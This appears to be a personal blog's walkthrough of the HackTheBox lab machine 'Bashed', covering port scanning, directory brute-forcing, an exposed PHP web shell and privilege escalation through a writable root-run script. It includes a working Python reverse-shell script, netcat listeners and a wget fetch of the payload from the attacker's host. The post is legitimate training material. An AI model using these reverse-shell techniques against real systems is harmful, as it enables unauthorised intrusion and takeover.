@@ -1,0 +1,226 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Bashed | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Blocky from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/18_bashed/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Bashed</h1> <p class="post-description">Blocky from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bashed/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Bashed Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Bashed" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Time to smash the Bashed.</p> <p>Run nmap to get a list of available ports.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.68             
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-29 00:32 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.68
+Host is up <span class="o">(</span>0.017s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Arrexel<span class="s1">'s Development Site
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 2 hops
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT      ADDRESS
+1   7.84 ms  10.10.16.1
+2   37.40 ms 10.10.10.68
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
+</span></code></pre></div></div> <p><br> Run nmap against all of the ports to get any potentially hidden services.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.68               
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-29 00:33 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.68
+Host is up <span class="o">(</span>0.020s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65534 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.85 seconds
+</code></pre></div></div> <p><br> Check the landing page that is being served on the web server.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bashed/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the one post that is displayed on the landing page. That looks interesting as an attack vector. Plus, should be on this server. Convenient.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bashed/post.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Post" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run the ffuf to try and brute-force directories.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.68/FUZZ <span class="nt">-e</span> .txt,.bak,.php <span class="nt">-fs</span> 7743
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.68/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .txt .bak .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 7743
+________________________________________________
+
+.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 12ms]
+images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 11ms]
+uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 18ms]
+php                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms]
+css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms]
+dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 8ms]
+js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 22ms]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
+fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 12ms]
+.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 18ms]
+server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 28ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+</span></code></pre></div></div> <p><br> Check the /dev directory and notice the phpbash.php.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bashed/dev.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Dev Directory" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the phpbash.php and run whoami to confirm code execution.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bashed/cmd.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Prove command execution" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Start a netcat listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                           
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Use revshells to generate a payload.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bashed/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Use Revshells" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the netcat listener and catch the shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                           
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.68] 52940
+<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");
+</span></code></pre></div></div> <p><br> Run sudo -l to get the list of all the commands that the user can run as sudo.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                           
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.68] 52940
+<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+www-data@bashed:/var/www/html/dev<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on bashed:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on bashed:
+    <span class="o">(</span>scriptmanager : scriptmanager<span class="o">)</span> NOPASSWD: ALL
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed
+:/var/www/html/dev# <span class="nb">cat</span> /home/arrexel/user.txt
+
+&lt;redacted&gt;
+www-data@bashed
+:/var/www/html/dev# ip a
+
+1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33:  mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:69:30 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.68/32 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:6930/64 scope global mngtmpaddr dynamic 
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb9:6930/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Run whoami using the sudo as scriptmanger just to test the command execution.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/dev/shm<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-i</span> <span class="nt">-u</span> scriptmanager <span class="nb">whoami
+sudo</span> <span class="nt">-i</span> <span class="nt">-u</span> scriptmanager <span class="nb">whoami
+</span>scriptmanager
+</code></pre></div></div> <p><br> List the files on the root directory. Notice the /scripts folder owned by the user that we have sudo privs to execute.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /
+<span class="nb">ls</span> <span class="nt">-la</span> /
+total 92
+drwxr-xr-x  23 root          root           4096 Jun  2  2022 <span class="nb">.</span>
+drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
+<span class="nt">-rw-------</span>   1 root          root            174 Jun 14  2022 .bash_history
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
+drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
+drwxr-xr-x  19 root          root           4140 Jan 28 05:25 dev
+drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
+lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -&gt; boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
+drwx------   2 root          root          16384 Dec  4  2017 lost+found
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
+drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
+dr-xr-xr-x 173 root          root              0 Jan 28 05:25 proc
+drwx------   3 root          root           4096 Jan 28 05:27 root
+drwxr-xr-x  18 root          root            500 Jan 28 05:25 run
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+dr-xr-xr-x  13 root          root              0 Jan 28 06:08 sys
+drwxrwxrwt  10 root          root           4096 Jan 28 06:15 tmp
+drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
+drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
+lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
+</code></pre></div></div> <p><br> As the scriptmanager, ls said scripts folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/dev/shm<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-i</span> <span class="nt">-u</span> scriptmanager <span class="nb">ls</span> <span class="nt">-la</span> /scripts
+<span class="nb">sudo</span> <span class="nt">-i</span> <span class="nt">-u</span> scriptmanager <span class="nb">ls</span> <span class="nt">-la</span> /scripts
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 <span class="nb">.</span>
+drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
+<span class="nt">-rw-r--r--</span>  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+<span class="nt">-rw-r--r--</span>  1 root          root            12 Jan 28 06:16 test.txt
+</code></pre></div></div> <p><br> Check the contents of the test.py file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-i</span> <span class="nt">-u</span> scriptmanager <span class="nb">cat</span> /scripts/test.py
+f <span class="o">=</span> open<span class="o">(</span><span class="s2">"test.txt"</span>, <span class="s2">"w"</span><span class="o">)</span>
+f.write<span class="o">(</span><span class="s2">"testing 123!"</span><span class="o">)</span>
+f.close
+</code></pre></div></div> <p><br> Start a second netcat listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444                             
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div> <p><br> Create a new test.py file to create a reverse shell.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">pty</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.10.16.12</span><span class="sh">"</span><span class="p">,</span><span class="mi">4444</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">sh</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div> <p><br> Create a python server to serve the test.py.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div> <p><br> Transfer the test.py to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/dev/shm<span class="nv">$ </span>wget http://10.10.16.12:8000/test.py
+wget http://10.10.16.12:8000/test.py
+<span class="nt">--2025-01-28</span> 06:33:24--  http://10.10.16.12:8000/test.py
+Connecting to 10.10.16.12:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 219 <span class="o">[</span>text/x-python]
+Saving to: <span class="s1">'test.py'</span>
+
+test.py             100%[<span class="o">===================&gt;]</span>     219  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.001s  
+
+2025-01-28 06:33:24 <span class="o">(</span>320 KB/s<span class="o">)</span> - <span class="s1">'test.py'</span> saved <span class="o">[</span>219/219]
+</code></pre></div></div> <p><br> Try moving the file to overwrite the /scripts/test.py. Notice that there was an error that states that the operation is not permitted.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                           
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> As I was trying to figure out what to do about that error, I checked the error and noticed that I caught a shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444                             
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.68] 46880
+<span class="c"># whoami</span>
+<span class="nb">whoami
+</span>root
+<span class="c">#</span>
+</code></pre></div></div> <p><br> Get the root.txt file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /root/root.txt</span>
+<span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+<span class="c"># ip a</span>
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:69:30 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.68/32 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:6930/64 scope global mngtmpaddr dynamic 
+       valid_lft 86395sec preferred_lft 14395sec
+    inet6 fe80::250:56ff:feb9:6930/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> And with that we bashed another box.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
